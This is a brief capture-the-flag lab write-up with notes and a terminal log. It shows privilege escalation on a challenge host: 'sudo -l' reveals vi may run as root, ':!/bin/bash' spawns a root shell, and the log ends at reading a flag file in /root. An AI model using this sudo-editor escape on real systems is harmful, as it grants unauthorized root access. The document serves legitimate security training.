# Lesson  
- Enumeration  
  - `sudo -l`
- Privilege Escalation  
  - use Editor  
    - vi/vim  
        e.g.
        ```
        :!pwd
        ```

# Memo
```zsh
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer:
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$   
picoplayer@challenge:~$ sudo /usr/bin/vi test

...

:!/bin/bash
...

root@challenge:/home/picoplayer# cd /root
root@challenge:~# 
root@challenge:~# pwd
/root
root@challenge:~# 
root@challenge:~# ls -la
total 12
drwx------ 1 root root   23 Aug  4 21:32 .
drwxr-xr-x 1 root root   51 Dec 28 16:03 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4 21:32 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
root@challenge:~# 
root@challenge:~# cat .flag.txt
```